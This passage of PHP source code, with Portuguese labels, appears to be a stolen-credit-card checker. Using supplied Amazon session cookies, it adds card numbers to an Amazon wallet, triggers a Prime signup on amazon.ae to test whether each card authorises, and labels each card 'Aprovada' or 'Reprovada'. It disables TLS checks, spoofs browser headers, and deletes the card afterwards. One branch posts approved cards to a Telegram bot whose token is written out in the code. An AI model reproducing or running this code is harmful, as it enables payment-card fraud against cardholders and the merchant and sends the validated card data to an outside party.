        curl_setopt($curl, CURLOPT_URL, 'https://www.amazon.com/business/register/business-prime?sif_profile=ab-reg&abreg_signature=jdVUBtMjCdM0Apj58w0EM1d9Tvj0Kh-QkVI-2aR5lyE%3D&abreg_entryRefTag=b2b_mcs_L1_regnav&abreg_usingPostAuthPortalTheme=true&abreg_originatingEmailEncrypted=AAAAAAAAAABzO8mToiVu%2Bg3q4kdVasyHNwAAAAAAAAA3rH85TDYWHevymZnxeecsLscxtqCviS35r6XawPydDumhXKFp7bYSG2%2Fzb2jCWKnVlA7ms7Pn&abreg_client=biss&abreg_originatingCustomerId=A1NZHXDR2VI2BK&ref_=ab_reg_notag_oin_wbp_ab_reg_dsk');
        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($curl, CURLOPT_LOW_SPEED_LIMIT, 0);
        curl_setopt($curl, CURLOPT_HEADER, 0);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($curl, CURLOPT_ENCODING, "gzip");
        curl_setopt($curl, CURLOPT_HTTPHEADER, array(
            'device-memory: 8',
            'sec-ch-device-memory: 8',
            'dpr: 1',
            'sec-ch-dpr: 1',
            'viewport-width: 1920',
            'sec-ch-viewport-width: 1920',
            'rtt: 150',
            'downlink: 10',
            'ect: 4g',
            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-ch-ua-platform-version: "15.0.0"',
            'upgrade-insecure-requests: 1',
            'user-agent: ' . $randomUserAgent . '',
            'cookie: ' . $cookie . '',
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site: same-origin',
            'sec-fetch-mode: navigate',
            'sec-fetch-user: ?1',
            'sec-fetch-dest: document',
            'referer: https://www.amazon.com/business/register/optional-inputs?sif_profile=ab-reg&abreg_signature=jdVUBtMjCdM0Apj58w0EM1d9Tvj0Kh-QkVI-2aR5lyE%3D&abreg_entryRefTag=b2b_mcs_L1_regnav&abreg_usingPostAuthPortalTheme=true&abreg_originatingEmailEncrypted=AAAAAAAAAABzO8mToiVu%2Bg3q4kdVasyHNwAAAAAAAAA3rH85TDYWHevymZnxeecsLscxtqCviS35r6XawPydDumhXKFp7bYSG2%2Fzb2jCWKnVlA7ms7Pn&abreg_client=biss&abreg_originatingCustomerId=A1NZHXDR2VI2BK&ref_=ab_reg_notag_bi_oin_ab_reg_dsk'
        ));
        $pula_parte_add_card = curl_exec($curl);

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, 'https://www.amazon.com/business/register/org/processing?sif_profile=ab-reg&abreg_signature=jdVUBtMjCdM0Apj58w0EM1d9Tvj0Kh-QkVI-2aR5lyE%3D&abreg_entryRefTag=b2b_mcs_L1_regnav&abreg_usingPostAuthPortalTheme=true&abreg_originatingEmailEncrypted=AAAAAAAAAABzO8mToiVu%2Bg3q4kdVasyHNwAAAAAAAAA3rH85TDYWHevymZnxeecsLscxtqCviS35r6XawPydDumhXKFp7bYSG2%2Fzb2jCWKnVlA7ms7Pn&abreg_client=biss&abreg_originatingCustomerId=A1NZHXDR2VI2BK&ref_=ab_reg_notag_wbp_bp_ab_reg_dsk');
        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($curl, CURLOPT_LOW_SPEED_LIMIT, 0);
        curl_setopt($curl, CURLOPT_HEADER, 0);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($curl, CURLOPT_ENCODING, "gzip");
        curl_setopt($curl, CURLOPT_HTTPHEADER, array(
            'device-memory: 8',
            'sec-ch-device-memory: 8',
            'dpr: 1',
            'sec-ch-dpr: 1',
            'viewport-width: 1920',
            'sec-ch-viewport-width: 1920',
            'rtt: 150',
            'downlink: 10',
            'ect: 4g',
            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-ch-ua-platform-version: "15.0.0"',
            'upgrade-insecure-requests: 1',
            'user-agent: ' . $randomUserAgent . '',
            'cookie: ' . $cookie . '',
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site: same-origin',
            'sec-fetch-mode: navigate',
            'sec-fetch-user: ?1',
            'sec-fetch-dest: document'
        ));
        $processa_assinatura = curl_exec($curl);

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, 'https://www.amazon.com/business/register/org/status?abreg_signature=_m3KfwVElSFNgDu4v21gotNaQB3_RULjrv7JgCnPOyM%3D&abreg_entryRefTag=ya_d_atf_us_b2b_reg_untargeted_rec&abreg_originatingEmailEncrypted=AAAAAAAAAABzO8mToiVu%2Bg3q4kdVasyHMAAAAAAAAAAyNn9nzh1M8OTa8ORgPYiNeE4p0ghvgrPIz8dqW96egFdr4zvZuv0VfRotb1BTVTQ&abreg_client=biss&abreg_originatingCustomerId=A2S7WOTV1RXEX2&ref_=ab_reg_notag_bl_bs_ab_reg_dsk');
        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($curl, CURLOPT_LOW_SPEED_LIMIT, 0);
        curl_setopt($curl, CURLOPT_HEADER, 0);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($curl, CURLOPT_ENCODING, "gzip");
        curl_setopt($curl, CURLOPT_HTTPHEADER, array(
            'cache-control: max-age=0',
            'device-memory: 8',
            'sec-ch-device-memory: 8',
            'dpr: 1.25',
            'sec-ch-dpr: 1.25',
            'viewport-width: 1498',
            'sec-ch-viewport-width: 1498',
            'rtt: 150',
            'downlink: 8.7',
            'ect: 4g',
            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-ch-ua-platform-version: "15.0.0"',
            'upgrade-insecure-requests: 1',
            'user-agent: ' . $randomUserAgent . '',
            'cookie: ' . $cookie . '',
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site: none',
            'sec-fetch-mode: navigate',
            'sec-fetch-user: ?1',
            'sec-fetch-dest: document'
        ));
        $processo_convidado = curl_exec($curl);

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, 'https://www.amazon.com/business/register/guest/onboard?ref_=ab_reg_notag_bs_gon_ab_reg_dsk');
        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($curl, CURLOPT_LOW_SPEED_LIMIT, 0);
        curl_setopt($curl, CURLOPT_HEADER, 0);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($curl, CURLOPT_ENCODING, "gzip");
        curl_setopt($curl, CURLOPT_HTTPHEADER, array(
            'device-memory: 8',
            'sec-ch-device-memory: 8',
            'dpr: 1.25',
            'sec-ch-dpr: 1.25',
            'viewport-width: 563',
            'sec-ch-viewport-width: 563',
            'rtt: 150',
            'downlink: 5.75',
            'ect: 4g',
            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-ch-ua-platform-version: "15.0.0"',
            'upgrade-insecure-requests: 1',
            'user-agent: ' . $randomUserAgent . '',
            'cookie: ' . $cookie . '',
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site: same-origin',
            'sec-fetch-mode: navigate',
            'sec-fetch-user: ?1',
            'sec-fetch-dest: document',
            'referer: https://www.amazon.com/business/register/org/status?abreg_signature=_m3KfwVElSFNgDu4v21gotNaQB3_RULjrv7JgCnPOyM%3D&abreg_entryRefTag=ya_d_atf_us_b2b_reg_untargeted_rec&abreg_originatingEmailEncrypted=AAAAAAAAAABzO8mToiVu%2Bg3q4kdVasyHMAAAAAAAAAAyNn9nzh1M8OTa8ORgPYiNeE4p0ghvgrPIz8dqW96egFdr4zvZuv0VfRotb1BTVTQ&abreg_client=biss&abreg_originatingCustomerId=A2S7WOTV1RXEX2&ref_=ab_reg_notag_bl_bs_ab_reg_dsk'
        ));
        $processo_convidado = curl_exec($curl);
    }

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, 'https://www.amazon.com/cpe/yourpayments/wallet');
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 0);
    curl_setopt($curl, CURLOPT_LOW_SPEED_LIMIT, 0);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_ENCODING, "gzip");
    curl_setopt($curl, CURLOPT_HTTPHEADER, array(
        'cache-control: max-age=0',
        'device-memory: 4',
        'sec-ch-device-memory: 4',
        'dpr: 1',
        'sec-ch-dpr: 1',
        'viewport-width: 1366',
        'sec-ch-viewport-width: 1366',
        'rtt: 50',
        'cookie: ' . $cookie . '',
        'downlink: 5.9',
        'ect: 4g',
        'sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-ch-ua-platform-version: "10.0.0"',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'sec-fetch-site: same-origin',
        'sec-fetch-mode: navigate',
        'sec-fetch-user: ?1',
        'sec-fetch-dest: document',
        'referer: https://www.amazon.com/cpe/yourpayments/settings/manageoneclick'
    ));
    $carteira = curl_exec($curl);

    $serializedState = dados($carteira, '"serializedState":"', '"');
    $customerID = dados($carteira, '"customerID":"', '"');

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, 'https://www.amazon.com/payments-portal/data/widgets2/v1/customer/' . $customerID . '/continueWidget');
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 0);
    curl_setopt($curl, CURLOPT_LOW_SPEED_LIMIT, 0);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_ENCODING, "gzip");
    curl_setopt($curl, CURLOPT_HTTPHEADER, array(
        'sec-ch-ua-platform: "Windows"',
        'viewport-width: 1366',
        'device-memory: 4',
        'sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-dpr: 1',
        'sec-ch-ua-mobile: ?0',
        'x-requested-with: XMLHttpRequest',
        'accept: application/json, text/javascript, */*; q=0.01',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'sec-ch-viewport-width: 1366',
        'downlink: 5.3',
        'widget-ajax-attempt-count: 0',
        'cookie: ' . $cookie . '',
        'ect: 4g',
        'sec-ch-device-memory: 4',
        'dpr: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'rtt: 50',
        'apx-widget-info: AB:YA:MPO/desktop/kzHo57KvPxaI',
        'sec-ch-ua-platform-version: "10.0.0"',
        'origin: https://www.amazon.com',
        'sec-fetch-site: same-origin',
        'sec-fetch-mode: cors',
        'sec-fetch-dest: empty',
        'referer: https://www.amazon.com/cpe/yourpayments/wallet'
    ));
    curl_setopt($curl, CURLOPT_POSTFIELDS, "ppw-jsEnabled=true&ppw-widgetState=$serializedState&ppw-widgetEvent=StartAddInstrumentEvent");
    $carteira_clica_add_card = curl_exec($curl);

    $serializedState_2 = dados($carteira_clica_add_card, '"serializedState\":\"', '\"');
    $clientId = dados($carteira_clica_add_card, '"clientId\":\"', '\"');

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, 'https://apx-security.amazon.com/cpe/pm/register');
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 0);
    curl_setopt($curl, CURLOPT_LOW_SPEED_LIMIT, 0);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_ENCODING, "gzip");
    curl_setopt($curl, CURLOPT_HTTPHEADER, array(
        'Host: apx-security.amazon.com',
        'Connection: keep-alive',
        'Cache-Control: max-age=0',
        'sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'Origin: https://www.amazon.com',
        'cookie: ' . $cookie . '',
        'Content-Type: application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site: same-site',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-User: ?1',
        'Sec-Fetch-Dest: iframe',
        'Referer: https://www.amazon.com/'
    ));
    curl_setopt($curl, CURLOPT_POSTFIELDS, "widgetState=$serializedState_2&returnUrl=%2Fcpe%2Fyourpayments%2Fwallet%3Fref_%3Dapx_interstitial&clientId=AB%3AYA%3AMPO&usePopover=true&maxAgeSeconds=900&iFrameName=ApxSecureIframe-pp-72TM83-5&parentWidgetInstanceId=kzHo57KvPxaI&hideAddPaymentInstrumentHeader=true&creatablePaymentMethods=CC");
    $prenchimento_add_card = curl_exec($curl);

    $widgetState = dados($prenchimento_add_card, '<input type="hidden" name="ppw-widgetState" value="', '">');

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, 'https://apx-security.amazon.com/payments-portal/data/widgets2/v1/customer/' . $customerID . '/continueWidget?sif_profile=APX-Encrypt-All-NA');
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 0);
    curl_setopt($curl, CURLOPT_LOW_SPEED_LIMIT, 0);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_ENCODING, "gzip");
    curl_setopt($curl, CURLOPT_HTTPHEADER, array(
        'Host: apx-security.amazon.com',
        'Connection: keep-alive',
        'sec-ch-ua-platform: "Windows"',
        'Widget-Ajax-Attempt-Count: 0',
        'sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile: ?0',
        'X-Requested-With: XMLHttpRequest',
        'cookie: ' . $cookie . '',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'APX-Widget-Info: AB:YA:MPO/desktop/ly5LAUVZHKYh',
        'Origin: https://apx-security.amazon.com',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Dest: empty',
        'Referer: https://apx-security.amazon.com/cpe/pm/register'
    ));
    curl_setopt($curl, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3AAddCreditCardEvent=&ppw-jsEnabled=true&ppw-widgetState=$widgetState&ie=UTF-8&addCreditCardNumber=$cc&ppw-accountHolderName=" . $nome . "+" . $sobre . "&ppw-expirationDate_month=$mes&ppw-expirationDate_year=$ano&addCreditCardVerificationNumber=&ppw-addCreditCardVerificationNumber_isRequired=false&ppw-addCreditCardPostalCode=&ppw-addCreditCardPostalCode_isRequired=false&ppw-updateEverywhereAddCreditCard=updateEverywhereAddCreditCard&__sif_encrypted_hba_account_holder_name=" . $nome . "+" . $sobre . "&ppw-issuer=$tipo2&usePopover=true&maxAgeSeconds=900&iFrameName=ApxSecureIframe-pp-72TM83-5&parentWidgetInstanceId=kzHo57KvPxaI&hideAddPaymentInstrumentHeader=true&creatablePaymentMethods=CC");
    $adiciona_card = curl_exec($curl);

    $widgetState_2 = dados($adiciona_card, '"ppw-widgetState\" value=\"', '">');
    $address_id = dados($adiciona_card, 'data-address-id=\"', '\"');

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, 'https://apx-security.amazon.com/payments-portal/data/widgets2/v1/customer/' . $customerID . '/continueWidget');
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 0);
    curl_setopt($curl, CURLOPT_LOW_SPEED_LIMIT, 0);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_ENCODING, "gzip");
    curl_setopt($curl, CURLOPT_HTTPHEADER, array(
        'Host: apx-security.amazon.com',
        'Connection: keep-alive',
        'sec-ch-ua-platform: "Windows"',
        'Widget-Ajax-Attempt-Count: 0',
        'sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile: ?0',
        'X-Requested-With: XMLHttpRequest',
        'cookie: ' . $cookie . '',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'APX-Widget-Info: AB:YA:MPO/desktop/ly5LAUVZHKYh',
        'Origin: https://apx-security.amazon.com',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Dest: empty',
        'Referer: https://apx-security.amazon.com/cpe/pm/register'
    ));
    curl_setopt($curl, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3ASelectAddressEvent=&ppw-jsEnabled=true&ppw-widgetState=$widgetState_2&ie=UTF-8&ppw-pickAddressType=Inline&ppw-addressSelection=$address_id");
    $endereco_card = curl_exec($curl);

    /* ---------------- AREA ATIVAR COOKIES ---------------- */

    function prime_teste($cookiepl, $last, $datajson) {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, 'https://www.amazon.ae/gp/prime/pipeline/membersignup');
        curl_setopt($curl, CURLOPT_POST, false);
        curl_setopt($curl, CURLOPT_ENCODING, "gzip");
        curl_setopt($curl, CURLOPT_HEADER, true);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $headers = array(
            "Host: www.amazon.ae",
            "Cookie: $cookiepl",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "viewport-width: 1536",
            "content-type: application/x-www-form-urlencoded",
        );
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        $string_decoded = html_entity_decode(curl_exec($curl));

        $token_verify = dados($string_decoded, 'name="ppw-widgetState" value="', '"');
        $offerToken = dados($string_decoded, 'name="offerToken" value="', '"');
        $customerId = dados($string_decoded, '"customerId":"', '"');
        $sessionId = dados($string_decoded, '"sessionId":"', '"');
        $instrumentidori = dados($string_decoded, 'instrumentId&quot;:[&quot;', '&quot;');
        $metodo = dados($string_decoded, '"selectedInstrumentIds":["', '"');

        if (empty($customerId)) {
            $customerId = dados($string_decoded, '"customerID":"', '"');
        }
        if (empty($sessionId)) {
            $sessionId = trim(dados($string_decoded, 'sessionId&quot;:&quot;', '&'));
        }
        if (empty($instrumentidori)) {
            $instrumentidori = trim(dados($string_decoded, 'value=&quot;instrumentId=', '&'));
        }
        if (empty($token_verify)) {
            $token_verify = trim(dados($string_decoded, 'name=&quot;ppw-widgetState&quot; value=&quot;', '&'));
        }

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, 'https://www.amazon.ae/payments-portal/data/widgets2/v1/customer/' . $customerId . '/continueWidget');
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_ENCODING, "gzip");
        curl_setopt($curl, CURLOPT_HEADER, true);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $headers = array(
            "Host: www.amazon.ae",
            "Cookie: $cookiepl",
            "viewport-width: 1536",
            "content-type: application/x-www-form-urlencoded",
        );
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_POSTFIELDS, "ppw-jsEnabled=true&ppw-widgetState=$token_verify&ppw-widgetEvent=SavePaymentPreferenceEvent");
        $post_verify1 = curl_exec($curl);

        $card_id2 = dados($post_verify1, '"preferencePaymentMethodIds":"[\"', '\"');

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, "https://www.amazon.ae/hp/wlp/pipeline/actions");
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_ENCODING, "gzip");
        curl_setopt($curl, CURLOPT_HEADER, true);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $headers = array(
            'Host: www.amazon.ae',
            'Origin: https://www.amazon.ae',
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Referer: https://www.amazon.com/hp/wlp/pipeline/membersignup?offerToken=xRKiqLclgAT1kXj397rrXENBOVIIzaj48tANcdAddSGvusiByzPUJoxSXBCbeDl0r--gQeUbF0lm3RbebV-wMXP3WQPcBwnO-l5faBLAIvSKpjW5GNwTC7PGLZBWSzgyzBeKUC472INiw7nXy8rahOt7FuTrYv55ze94YWDqjLiDLJ-8OE6Om73SMZtPxocAWd5Ev-f_gTQnvek8a7uD7GT-HsQZ47YUqq1FYzvjRI6xdkImL9TI619iML8zM9pItJF9RP2hLxvglMBwur8XcPook0VnUR_Bm6krlQv4XiF4ZYg7gFepXZ47PSLwbYEEiZpbZdHgHDrA-HKtmpedJhv4ji_PlrgVpqewzXv3c8ITr189LwzC2s6URj3eCCzZRkUwGXHCZcwH5FDOtpdHywWmwJe6vQNXmCOS8goKa3842IoxUkxEJ0kaDJ30R-rWcCfoIepIRz5avlgHWLSMVVnZztDlXEEALULYY4j8Jjj5SNVJJON3bBqtW2oHmXnTSMtidTUnrVXOLYvbl9GV_c6mw_nuwF5eQJ4CbCwPLMzyy7ZZk3pg532XUPlyDE89cj9INx-J6Q4FAPfo8KEhxUdxEmk8XJt9hty36w4pogDy6dPhRcAPvYLV4KngXOMbafZ4xYHoV7u1UjWoCRwOCu3WE4fxc1ux1gWALrmqnPc8U5q-G7-7kODvlNc1cv6GODre6wEhV2roXPQ7Yp2-BuzK-NyQiAeWJJYg_cAdCCZjsRoLJUzT&location=prime_default&actionResult=%257B%2522success%2522%253A0%252C%2522errorType%2522%253A%2522HARDVET_VERIFICATION_FAILED%2522%252C%2522action%2522%253A%2522hardVet%2522%257D',
            'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cookie: ' . $cookiepl . ''
        );
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_POSTFIELDS, "offerToken=$offerToken&session-id=$sessionId&locationID=prime_confirm&primeCampaignId=SlashPrime&redirectURL=L2dwL3ByaW1l&cancelRedirectURL=Lw&wlpLocation=prime_confirm&isAsinEligibleForFamilyBenefit=0&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&paymentMethodId=$card_id2&isHorizonteFlow=1&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet");
        return $post_verify3 = curl_exec($curl);
    }

   $mesgirespfim = prime_teste($cookiesa, $last, $datajson);
deletecard($datajson);

if (strpos($mesgirespfim, 'BILLING_ADDRESS_RESTRICTED') !== false || strpos($mesgirespfim, 'Non è stato possibile completare la tua iscrizione a Prime. Ti consigliamo di riprovare durante il proceso di checkout.') !== false) {
    echo "Aprovada $lista | Authorised  usa";
    exit();
    // Enviar live aprovada para o bot do Telegram
$mensagem = urlencode("✅ Live aprovada: $live_aprovada"); // substitua pela variável correta
file_get_contents("https://api.telegram.org/bot7748457693:AAHGW30nEHdbGBI6pCZNdQPzCUgUPiUfO4k/sendMessage?chat_id=SUBSTITUIR_CHAT_ID&text={$mensagem}");
    exit();
} else if (strpos($mesgirespfim, 'InvalidInput') !== false) {
    echo "Reprovada $lista | PAGAMENTO RECUSADO  usa";
    exit();
} else if (strpos($mesgirespfim, 'HARDVET_VERIFICATION_FAILED') !== false || strpos($mesgirespfim, 'hardVet') !== false || strpos($mesgirespfim, "HARDVET_VERIFICATION_FAILED") !== false) {
    echo "Reprovada $lista | PAGAMENTO RECUSADO  usa";
    exit();
} elseif (strpos($mesgirespfim, 'There was an error validating your payment method') !== false || strpos($mesgirespfim, "There was an error validating your payment method. Please update or add a new payment method and try again") !== false) {
    echo "Reprovada $lista | ERRO NA VALIDAÇÃO DO MÉTODO DE PAGAMENTO  usa";
    exit();
} else {
      echo "<font color='white'>Reprovada -> $lista | Retorno:<font color='red'> VERIFIQUE O SEUS COOKIES, COOKIES RUIM</font>";
      header('HTTP/1.1 200 OK');
      exit();
}
} else {
    $cardInfo = bin($bin);
    echo "Reprovada $lista | CARTÃO INVÁLIDO  usa";
    header('HTTP/1.1 200 OK');
    exit();
}
?>


